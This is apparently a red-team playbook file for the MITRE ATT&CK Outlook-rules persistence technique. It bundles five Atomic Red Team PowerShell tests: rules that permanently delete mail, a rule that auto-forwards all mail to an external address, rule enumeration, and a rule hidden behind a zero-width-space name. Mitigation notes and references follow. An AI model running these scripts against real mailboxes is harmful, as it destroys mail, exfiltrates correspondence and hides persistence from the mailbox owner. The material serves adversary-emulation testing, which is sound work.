---
name: "T1137.005_outlook-rules"
description: "Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1137.005
  - persistence
  - windows
  - office-suite
  - sub-technique
technique_id: "T1137.005"
tactic: "persistence"
all_tactics:
  - persistence
platforms:
  - Windows
  - Office Suite
mitre_url: "https://attack.mitre.org/techniques/T1137/005"
tech_stack:
  - windows
  - office
cwe_ids:
  - CWE-276
chains_with:
  - T1137
  - T1137.001
  - T1137.002
  - T1137.003
  - T1137.004
  - T1137.006
prerequisites:
  - T1137
severity_boost:
  T1137: "Chain with T1137 for deeper attack path"
  T1137.001: "Chain with T1137.001 for deeper attack path"
  T1137.002: "Chain with T1137.002 for deeper attack path"
---

# T1137.005 Outlook Rules

> **Sub-technique of:** T1137

## High-Level Description

Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.

Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.

## Kill Chain Phase

- Persistence (TA0003)

**Platforms:** Windows, Office Suite

## What to Check

- [ ] Identify if Outlook Rules technique is applicable to target environment
- [ ] Check Windows systems for indicators of Outlook Rules
- [ ] Check Office Suite systems for indicators of Outlook Rules
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object

Creates a malicious Outlook rule via the COM object that permanently deletes
emails when an email with a specific subject keyword arrives. Simulates
adversary persistence via Outlook Rules (T1137.005). Uses DeletePermanently
action as it does not require a resolved Exchange folder unlike MoveToFolder.
NOTE: olRuleActionStartApplication cannot be created programmatically per
Microsoft's Rules object model - DeletePermanently is used as the supported
equivalent that generates the same rule-creation artefact.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

**Supported Platforms:** windows

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$cond = $rule.Conditions.Subject
$cond.Enabled = $true
$cond.Text    = @("#{trigger_subject}")

$action         = $rule.Actions.DeletePermanently
$action.Enabled = $true

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Rule '#{rule_name}' created. Emails with subject '#{trigger_subject}' will be permanently deleted."
```

**Dependencies:**

- Classic Outlook must be installed (required for COM automation)

### Atomic Test 2: Outlook Rule - Sender Address Trigger with DeletePermanently Action via COM Object

Creates an Outlook rule via COM that permanently deletes emails received
from a specific sender address. Adversaries use sender-based triggers to
make rules appear more legitimate (e.g. disguised as a filter for a
specific colleague). Tests a different rule condition path through the
COM object model. Uses DeletePermanently as it does not require a resolved
Exchange folder unlike MoveToFolder.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

**Supported Platforms:** windows

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$cond = $rule.Conditions.From
$cond.Enabled = $true
$cond.Recipients.Add("#{trigger_sender}")
$cond.Recipients.ResolveAll() | Out-Null

$action         = $rule.Actions.DeletePermanently
$action.Enabled = $true

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Sender-based rule '#{rule_name}' created. Emails from '#{trigger_sender}' will be permanently deleted."
```

**Dependencies:**

- Classic Outlook must be installed (required for COM automation)

### Atomic Test 3: Outlook Rule - Auto-Forward Emails to External Address via COM Object

Creates an Outlook rule that automatically forwards all received emails to
an external address. Simulates Business Email Compromise (BEC) and insider
threat scenarios where adversaries establish forwarding rules to exfiltrate
mail. One of the most commonly observed real-world abuses of Outlook rules.
Detected by Exchange mail flow anomalies and Microsoft Secure Score
forwarding alerts.
NOTE: No actual email is forwarded during this test - the rule is created
but a trigger email is not sent. Run cleanup immediately after verification.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

**Supported Platforms:** windows

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$action = $rule.Actions.Forward
$action.Enabled = $true
$action.Recipients.Add("#{forward_to_address}")
$action.Recipients.ResolveAll() | Out-Null

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Auto-forward rule '#{rule_name}' created -> #{forward_to_address}"
Write-Host "[!] Run cleanup immediately after verifying rule creation in Outlook."
```

**Dependencies:**

- Classic Outlook must be installed (required for COM automation)

### Atomic Test 4: Outlook Rules - Enumerate Existing Rules via PowerShell COM Object

Enumerates all Outlook rules configured on the local profile using the
PowerShell COM object. Simulates the discovery phase where an adversary
audits existing rules before implanting their own, or where a threat actor
tool such as Ruler lists rules to understand the environment. This
enumeration should itself generate telemetry - use it to validate that
your monitoring catches PowerShell spawning Outlook COM for recon purposes.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

**Supported Platforms:** windows

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook = New-Object -ComObject Outlook.Application
$rules   = $outlook.GetNamespace("MAPI").DefaultStore.GetRules()

Write-Host "`n[*] Enumerating Outlook rules on local profile..."
Write-Host "    Total rules found: $($rules.Count)`n"

for ($i = 1; $i -le $rules.Count; $i++) {
    $r = $rules.Item($i)
    Write-Host "  Rule $i : Name='$($r.Name)' | Enabled=$($r.Enabled)"
}

if ($rules.Count -eq 0) {
    Write-Host "  (No rules configured)"
}
```

**Dependencies:**

- Classic Outlook must be installed (required for COM automation)

### Atomic Test 5: Outlook Rule - Create Rule with Obfuscated Blank Name (MAPI Evasion)

Creates an Outlook rule with a zero-width space as its display name,
making it appear blank and invisible in the standard Outlook Rules UI.
Simulates the hidden inbox rule technique documented by Damian Pfammatter
(2018) and referenced in MITRE ATT&CK T1137.005 - adversaries use MAPI
editors or Ruler to blank PR_RULE_MSG_NAME so the rule does not appear
during casual rule auditing. Tests whether monitoring catches rules that
are invisible in the Outlook GUI but detectable via MFCMapi or
Get-InboxRule on Exchange. Uses PlaySound action as RunApplication
cannot be created programmatically per Microsoft's Rules object model.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.
NOTE: Script is written to a temp file before execution to prevent the
ART executor's quote-wrapping from mangling the zero-width space bytes.

**Supported Platforms:** windows

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}
$tmpScript = "$env:TEMP\T1137005_hidden_rule_create.ps1"
$lines = @(
    '$hiddenName = [System.Text.Encoding]::Unicode.GetString([byte[]](0x0B, 0x20))',
    '$outlook   = New-Object -ComObject Outlook.Application',
    '$namespace = $outlook.GetNamespace("MAPI")',
    '$rules     = $namespace.DefaultStore.GetRules()',
    '$rule      = $rules.Create($hiddenName, 0)',
    '$cond = $rule.Conditions.Subject',
    '$cond.Enabled = $true',
    '$cond.Text    = @("#{trigger_subject}")',
    '$action          = $rule.Actions.PlaySound',
    '$action.Enabled  = $true',
    '$action.FilePath = "#{sound_file_path}"',
    '$rule.Enabled = $true',
    '$rules.Save()',
    'Write-Host "[+] Hidden rule created with zero-width space name."',
    'Write-Host "[*] Open Outlook via File -> Manage Rules and Alerts - rule name will appear blank."',
    'Write-Host "[*] Verify rule exists via PowerShell COM enumeration (Test 4) or Get-InboxRule in Exchange."'
)
$lines -join "`n" | Set-Content -Path $tmpScript -Encoding UTF8
powershell.exe -NoProfile -ExecutionPolicy Bypass -File $tmpScript
Remove-Item $tmpScript -ErrorAction SilentlyContinue
```

**Dependencies:**

- Classic Outlook must be installed (required for COM automation)
- Sound file must exist for PlaySound action

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Outlook Rules by examining the target platforms (Windows, Office Suite).

2. **Assess Existing Defenses**: Review whether mitigations for T1137.005 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1051 Update Software

For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems.

### M1040 Behavior Prevention on Endpoint

On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk.

## Detection

### Detect Persistence via Malicious Outlook Rules

## Risk Assessment

| Finding                            | Severity | Impact      |
| ---------------------------------- | -------- | ----------- |
| Outlook Rules technique applicable | Low      | Persistence |

## CWE Categories

| CWE ID  | Title                         |
| ------- | ----------------------------- |
| CWE-276 | Incorrect Default Permissions |

## References

- [Pfammatter - Hidden Inbox Rules](https://blog.compass-security.com/2018/09/hidden-inbox-rules-in-microsoft-exchange/)
- [Microsoft Detect Outlook Forms](https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack)
- [SilentBreak Outlook Rules](https://silentbreaksecurity.com/malicious-outlook-rules/)
- [SensePost NotRuler](https://github.com/sensepost/notruler)
- [Atomic Red Team - T1137.005](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1137.005)
- [MITRE ATT&CK - T1137.005](https://attack.mitre.org/techniques/T1137/005)
